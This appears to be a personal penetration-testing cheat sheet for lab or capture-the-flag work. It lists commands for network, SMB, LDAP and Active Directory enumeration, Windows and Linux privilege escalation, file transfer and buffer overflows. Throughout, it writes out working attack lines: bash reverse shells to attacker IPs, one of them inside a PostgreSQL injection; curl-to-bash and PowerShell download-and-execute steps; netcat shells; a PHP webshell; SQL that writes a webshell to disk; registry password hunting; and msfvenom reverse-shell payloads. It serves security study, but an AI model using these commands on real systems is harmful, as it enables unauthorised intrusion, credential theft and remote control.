# Basic Steps

[Tyler's Notebook](https://southeasttech-my.sharepoint.com/:o:/g/personal/tyler_ramsbey_southeasttech_edu/EmrNEjx_FjRKjYRotc9TikMB7DtzCwhKWOAEovdtZADBgg?rtime=bQkHVxRr20g)
[a lot of good stuff](https://book.hacktricks.xyz/)
[Cheat sheets](https://pentestmonkey.net/)
[pyenv for python2](https://www.kali.org/docs/general-use/using-eol-python-versions/)

# Check list
- script: save all commands
  - exit
- Start-Transcript -Path "C:\Pentesting\03-21-2021-0200pm-exploitation.log"
  - Stop-Transcript

## Automatic web enum
- wpsscan -U user -P password
- [crackmapexec](https://www.crackmapexec.wiki/)

## Basic network
- nmap (all ports)
  - script: 
    - find / -type f -name ftp* 2>/dev/null | grep scripts
    - locate -r nse$ | grep NAME
    - locate -r nse$ | xargs grep categories
    - locate -r nse$ | xargs grep categories | grep 'default\|version\|discovery|' | grep sNAME
  - sudo nmap -p- -Pn -sS -sV -v --version-all $target -oA AllPort
  - sudo nmap -p -Pn -A $target -oA Services
  - sudo nmap -Pn -sV -sS -p --script vuln $target -oN Vuln.txt
    - -v Version
    - -A os, in-build scripts
    - -sC default scripts
    - -F: fast mode, fewer ports
  - scripts
    - --script ssl*
    - fpt-anon
    - --script-trace: see commands sent

  - scripts
    - --script=nfs-ls,nfs-statfs,nfs-showmount
    - --script=smb-enum-shares.nse,smb-enum-users.nse

    - ports=$(sudo nmap -Pn -T4 $target -oN ports.txt | egrep "^[0-9]{2,5}" | sed -E "s#/.*##g" | tr "\n" "," | sed 's/.$//' )&& echo $ports
  
- rustscan
  - docker run -it --rm --name rustscan rustscan/rustscan:2.1.1
  - alias rustscan='docker run -it --rm --name rustscan rustscan/rustscan:2.1.1'

- Find internal hosts (ping sweep)

### DNS
- Port 53 UDP/TCP
  - -sU UDP
  - TCP: zone transfer
  - add entry to etc/hosts
    - echo "$target      domain" | sudo tee -a /etc/hosts
 - remove entry
  - sudo sed -i "/$target      domain/d" /etc/hosts
  
- dig $target +short
  - dig $target -t RECORD +short
  - dig axfr domain @ATTACKING
- host $target
  - host -t ns $target
  
#### Find domains
- dnsenum
- nmap
  -  nmap -T4 -p53 --script dns* $target
- fierce --domain domain
- dnsrecon -d DOMAIN -std
  - dnsrecon -d $target -r networl
- wfuzz -c -w WORDLIST -u "http://$target/" -H "Host: FUZZ.$target" -f output.txt --hw (hide word/line/etc)

## Login
- brute force: hydra
- sqlmap

## Windows - Priv
- [Good advices](https://nored0x.github.io/red-teaming/windows-enumeration/)
- [Good Advices 2](https://infosecwriteups.com/privilege-escalation-in-windows-380bee3a2842)
- [Windows enumeration](https://fuzzysecurity.com/tutorials/16.html?ref=172.16.77.130)

- [LOLBAS](https://lolbas-project.github.io/)
- whoami /priv
- "tasklist /svc
- systeminfo
  - architecture 
    - [Environment]::Is64BitProcess
    - [Environment]::Is32itProcess
- icalcs file = permission
- dir / attrib / get-childitem -Forcet
- nestat -ano = network process
  - tasklist
  
- browser cache
  - procdump (process)
- RPC - 132
  - rpcclient
  - looksupsid.py
- Enumerate register
- scheduled task
- UAC
- Check loggings
  - sysmon enable / powershell loggging enabled ?
- echo %VARIABLE%
  - PATH $Env:PATH
- Unquoted services:
  - wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows
- Permissions:
  - icalcs
- eventvwr
- RCE admin: change user
- Check files on user:
  -  cmd /c dir /s /b /a:-d-h \Users\chase | findstr /i /v appdata
- Credentials
  - SYSTEM and SAM
  
- **Automatic scans**
  - winpeas
  - [privesc_check](https://github.com/pentestmonkey/windows-privesc-check)
  - [powerup](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc)
  - [suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
  - [Peas Family](https://github.com/carlospolop/PEASS-ng/tree/master)
  - Empire modules:  /usr/share/powershell-empire/empire/server/modules/
  - /usr/share/webshell
  - jaws-enum

### Kerberos
- Enumerate
  - setspn -T medin -Q ​ */* = extract accounts from Service Principal Name

### Registry
- Passwords:
  - REG QUERY HKLM /F "password" /t REG_SZ /S /K
  - REG QUERY HKCU /F "password" /t REG_SZ /S /K
  - REG QUERY HKLM /F "password" /t REG_SZ /S /d
  - REG QUERY HKCU /F "password" /t REG_SZ /S /d
  - REG QUERY "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon" /v DefaultPassword /reg:64
  - SAM:%SystemRoot%\System32\config\SAM
  - System:%SystemRoot%\System32\config\system

### Active Directory
[Cheatsheet](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse)
[Cheatsheet](https://viperone.gitbook.io/pentest-everything/everything/everything-active-directory/ad-enumeration)

#### Enumerate
[GTfobins for Active Directory -WADComs](https://wadcoms.github.io/#)
- domain name
  - nslookup $target 127.0.0.1
  
**AD**
- ldapsearch -h $target
  - ldapsearch -h domain.com -D 'ldap@support.htb' -w 'PASS' -b "DC=domain,DC=htb"| less"CN=Users,DC=domain,DC=com"
  - ldapsearch -h domain.htb -D "
  - ldapsearch -x -b "dc=domain,dc=com -H ldap://$target
  - ldapsearch -h domain.com -x -s name name
  -
  
- Extract meta info
  - ldapdomaindump -u 'USERNAME\ldap' -p 'PASS' dc.domain.htb

- find users:
  - rpcclient -U "" -N $target
  - rpcclient -U'%' $TARGET
    - enumdomusers
```
# Brute-Force users RIDs
for i in $(seq 500 1100); do
    rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo "";
done
```
- getADUsers.py -all domain/user -dc-ip $target

- Inside shell
  - net user /domain
  - net user username
  
  - Bloodhound:
    - Sharphound.exe --CollectionMethods <ALL/Default/Sessions> --Domain za.tryhackme.com --ExcludeDCs
    - bloodhound-python -c ALL --dns-tcp -d name.htb -ns $TARGET -u USERNAME -p 'PASS'
    - find connections + bloodhound has attacking detais
      - [Download](https://github.com/dirkjanm/BloodHound.py)
      - [Docker](https://github.com/belane/docker-bloodhound)

- **kerberos pre authentication disabled? - Kerbrute**
  - kerbrute: identify users
  - getPNusers.py: fetch hash
    -  GetNPUsers.py -dc-ip $target -outputfile kerberos_hashes.txt -request -debug $Domain/User -no-pass
 
#### Privege Escalation
- **GenericAll**
  - create computer
- **WriteDACL**
  - create user: net user NAME /add /domain
  - add user to group with writeDACT: net group "groupName" /add | net localgroup "groupName" /add
  - Upload powerview
  - Assign privilege

- Create object credential  
```
$username = 'plaintext'
$password = 'Password123'
pass = convertto-securestring $password -asplain -force

# Option 1
$cred = new-object system.management.automation.pscredential('htb\john', $pass)

# Option 2
$cred = New-Object System.Management.Automation.PSCredential $username, $secpassword

Add-ObjectACL -PrincipalIdentity john -Credential $credt -Rights DCSync

New-PSDrive -Name "N" -Root "\\Attacker\share" -PSProvider "FileSystem" -Credential $cred
``` 
- run *secretsdump* (impackt) with new user to retrieve hashes

### SMB
- SMBMAP
  - smbmap -H $target = Check Privileges 
  - smbmap -H $target -r share --depth 5
    - --download "share\file.txt"
  - smbmap -H $target -u Administrator -p 'Password@1' 
- rpclient -U '%'
- SMB-CLIENT: write/read
- smbclient -N -L //$target/ = List Shares
- smbclient -L //$target -U admin/administrator
- smbclient //$target/Users = Interactive shell to a share
  - mask ""
  - mget *
  - recurse ON
  - prompt off
  - allinfo = alternate stream
    - get/more File.ext:ADS
- smbclient  \\\\$target\\share$ = Open a Null Session
- smbclient //friendzone.htb/general -U "" = see files inside'
- smbclient -N -L //$target/ = List Shares as Null User
  - -N = no password
- smbclicmb -U 'administrator%Password@1' \\\\\$target\\C$
- Nmap scripts
  - smb-enum-users.nse
  - smb-os-discovery
  - smb-protocols
  - smb-enum-shares
  - smb-vuln*
- **mount**
  - mkdir -p /mnt/SHARE
  - mount -v -t cifs //$TARGET/share -o 'username=USER,password=PASS' /mnt/SHARE
  - sudo mount -t cifs -o username=plaintext,password=Password123,domain=. //$TARGET/share /mnt/share
  - mount -t cifs //$TARGET/share /mnt/share -o credentials=/path/credentialfile
```
# Credential file
username=plaintext
password=Password123
domain=.
```
- Online tips:
  - [smb enum](https://github.com/byt3bl33d3r/CrackMapExec/wiki/SMB-Command-Reference)
- psexec.py user:pass@$target COMMAND

- Mount windows smb in windows
  - mount -t cifs //$target/share /mnt/name
  
- crakmapexec smb $TARGET
  - --shares
  - -u '' -p ''

### FTP
- Banner grabbing
  - nc -vn $TARGET 21
  - openssl s_client -connect $TARGET:21 -starttls ftp #Get certificate if any
- ftp $TARGET
  - anoynmous:anonymous
  - binary # extract binary
  - ascii # extract ascii
  - --no-passive
- nmap --script ftp-*

## Linux
- [GTFOBins](https://gtfobins.github.io/)
- sudo -l
- groups
  - getent group NAME
  - /etc/group
- history
- ps aux / ps au
- SUID - Privileges Escalation
  - find / -perm -u=s -type f 2>/dev/null
  - find / -type f -perm -04000 -ls 2>/dev/null 
  - find / -type f -perm -4000 -user root -ls 2>/dev/null
  - find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
  - find / -type f -perm -u=s -user root -ls 2>/dev/null
  - find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
- Capabilities
  - find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
- Writables path/files
  - find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
- Passwords:
  - grep --color=auto -rnw '/' -ie "Password" --color=always 2>/dev/null
  - grep --color=auto -rnw '/etc' -ie "Password" --color=always 2>/dev/null
  - find /etc -type f -exec grep -i -I "pass" {} /dev/null \;
  - 
- Read all files in a folder
  - find /path/target -type f -exec cat {} +
  - find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep blabla = hidden
  - find / -type d -name ".*" -ls 2>/dev/null
- Writeable paths
  - find / -path /proc -prune -o -type d -perm -o+w 2>/dev/null
- Executables
  - full path / path hijacking

- Network
  - route
  - netstat 
    - -tlnp
    - -rn
  - /etc/resolv.conf
  - arp -a
- lscpu
- Mount/umount
    - lsblk -a
    - fstab
    - df -h
    - cat /etc/fstab | grep -v "#" | column -t
- Printers
  - lpstat
- shells
  - cat /etc/shells
- lspci -t -v
- Groups: 
  - id: LXD, Docker, Disk, ADM
- crontab
- Static
  - uname -a: kernel
  - lscpu: cpu type
  - lsusb -v
- Automatic tools
  - LinEnum.sh 
  - LinPeas
  - psexec.py
  - pspy
- Read/write PATH (path hijacking)
- Logs/logrotate
  
- Shell stabilize
  - python3 -c 'import pty;pty.spawn("/bin/bash")'
  - python3 -c  import pty;pty.spawn('/bin/bash') 
  - python -c 'import pty; pty.spawn("/bin/bash")'
  - CTRL+Z
  - echo $TERM
    - export TERM=xterm
  - stty size
    - stty raw -echo; fg
    - stty rows ## columns ##
  - reset
- Webshell php
  - <?php system($_GET['cmd']);?>
  
- Automatic scan
  - linpeas
  - linenum
  - pspy - for process
  - [lynis](https://github.com/CISOfy/lynis)

- export PATH=/tmp:$PATH = possible?

## Web
- POST: check source code
- dirb | dirsearch | gobuster | ffuz | wfuzz
  - wfuzz -c -u 'https:/target' -H "Host: FUZZ.target" -w WORDLIST--hh (hide/show)
  - gobuster -k (no tls validation) -w wordlist -x ext,ext,ext
```
png,jpg,config,html,asp,aspx,php,php5,xml,htm,exe
```
- Input fields / parameter
  - c:/windows/win.ini
  - /etc/passwd
- cgi-bin = content
  - Apache!!!!
    - /etc/apache2/sites-available/000-default.conf
    - /var/www/html
    - ffuf -u https://example.com/cgi-bin/FUZZ.cgi -w wordlist.txt
    - dirb http://$target -x Extensions (.pl .cgi .sh .ps1)
- SQL endpoints
  - Find if crash
  - ORDER BY [Total_Columns]--
  - UNION SELECT c1,c2,c3...cn--
  - UNION SELECT c1,c2,@@version,...cn--
  - UNION SELECT c1,c2,@@version,...cn--
    - UNION SELECT c1,ce,(UNION SELECT column_flag FROM table_flag)--
  - parameters?
  - group_concat() = all values from != rows into one string
  - Where are files written? / DocumentRoot
    - SELECT "<?php system($_GET['cmd']); ?>" into outfile "PATH/TO/SQL"
  - locate webshells
  - Cheatsheets
    - [Portswigger](https://portswigger.net/web-security/sql-injection/cheat-sheet)
    - [Pentestmonkey](https://pentestmonkey.net/category/cheat-sheet)
```
# Example PostgreSQl
'; CREATE TABLE cmd_exec(cmd_output text); --
'; COPY cmd_exec FROM PROGRAM 'bash -c ''bash -i >& /dev/tcp/10.10.14.107/1234 0>&1'''; --
```

##  File Transfer
### Windows
- powershell -c Invoke-Webrequest -OutFile nc.exe http://10.9.1.255:8080/nc.exe
- powershell -c wget http://10.9.1.255:8080/nc.exe -outfile "nc.exe"
- certutil -urlcache -f http://$attacking:80/nc.exe nc.exe
- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/Invoke-Powershell.ps1'); Invoke-MS16032 -Command 'C:\\Users\\Public\\nc.exe -e cmd.exe 10.10.XX.XX 1337' 
  - Append Command End of script
  - Invoke-Name_Script -Reverse -IP 123 -Port 123
- iex(New-Object Net.WebClient).DownloadString('http://$attacking:PORT/shell.exe'); shell.exe 
- **SMB**
  - Attacker
    - impacket-smbserver share $(pwd) -smb2support
    - smbserver.py share .
    - smbserver.py -smb2support -username USER -password PASS share /path/to/share/local
  - Victim
    - net use \\AttackingIP\share
    - net use x: \\IP\share /user:USER PASS = send to drive X:
    - copy file x:\
    - copy \\$attacker\share\file
    - copy \\IP\\share\file.ext 
- [Other methods](https://www.hackingarticles.in/file-transfer-cheatsheet-windows-and-linux/)

```
# ipsec method, create share on linux and connect target to it
$pass = convertto-securestring 'pass' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('username', $pass)

# generate smb connection
New-PSDrive -Name user -PSProvider FileSystem -Credential $cred -Root\\$IPATTACKING\ShareName

# Encode command
cat file | iconv -t utf-16le | base64 -w 0 = result

# Execute enconded command
echo powershell -enc result


# Read PScredential
Import-CliXml
Export-CliXml

powershell -c "$credential = import-clixml -path
C:\Data\Users\app\crypted_file.txt;$credential.GetNetworkCredential().password"

$credential = import-clixml -path
C:\Data\Users\app\user.txt
$credential.GetNetworkCredential().password
```
- Binary
  - dnSpy
  - [wine](https://wine.htmlvalidator.com/install-wine-on-debian-11.html)
  -  mono
  - csharp online
  - ghidra

- Impackt
  - /opt/impacket/
    - smb: psexec.py
    - MSQL
  - [More Info](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)
  - [Other info](https://www.coresecurity.com/core-labs/open-source-tools/impacket)
  - [Nishang_Collection](https://github.com/samratashok/nishang/tree/master)
  
### Linux
- python3 -m http.server 8000
- wget attacker-machine:8000:file.ext
- curl attacker-machine:8000:file.ext

### Data extraction
- NC
  - receiver: nc -nlvt PORT > file
  - sender:   nc ATTACKER_IP PORT < file

- Base64
  - target: base64 -w0 file
  - Copy content
  - Attacker: base64 -d file
    - ltrace / strace

### Other methods
- Create a shell script that execute the desired command
```
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.125/5555 0>&1
```
- Upload the file to the target and execute it
  - curl 10.10.14.125:8888/shell.sh|bash (maybe encode)

# Buffer overflow
- Upload file on Immunity Debugger (windows)
  
```
# Define working folder
!mona config -set workingfolder c:\Users\admin\Desktop\patota

# Fuzzing
python3 -c 'print("A" * 5000)'
## Bytes
└─$ python3 -c "import sys; sys.stdout.buffer.write(b'A' * 188 + b'\xe2\x91\x04\x08')"
## send paramenter of function
## disas function

# Generate payload after fuzzing
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l TOTAL

# send created pattern through script
python script.py

# Find Offset with mona
!mona findmsp -distance TOTAL

# Finf offset with metasploit
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q EIP
```

- Write BBBB on "retn"

```
while bad_chars
  !mona bytearray -b "\x00" = remove bad chars | !mona bytearray -cpb "\x00" = remove bad chars
  strings.py = without bad chars
  !mona compare -f c:\Users\admin\Desktop\patota\bytearray.bin -a ESP-Address

!mona jmp -r esp -cpb "Badchars"
```

- Copy address and write it backwards
- Add padding: "\x90" * 16
- Shell code msfvenom without bad chars

```
msfvenom -p windows/shell_reverse_tcp LHOST=10.9.1.255 LPORT=80 EXITFUNC=thread -b "\x00\x0a" -f c
```

- In linux
```
# All steps above to find EIO

# Find dependencies
ldd file

# Ofsset of functions
readelf -s /dependencies | grep " system@"
readelf -s /dependencies | grep " exit@"

# extract strings from libc with hex offsetet
strings -a -t x /lib/dependency  | grep /bin/sh (find where bash is executed)
-a print all
-t x = hexadecimal

# Calculate address 
system = p dependency + @system
exit   = p dependency + shell | /bin/bash
shell  = p dependency + @exit

executable  "A" * offset + system + exit + shell
```

## Convert python
dos2unix file

## Pictures
- strings
- exiftool

## Payloads
- msfvenom - reverse -f aspx -o app.aspx
- -e x86/shikata_ga_nai
- windows/shell_reverse_tcp 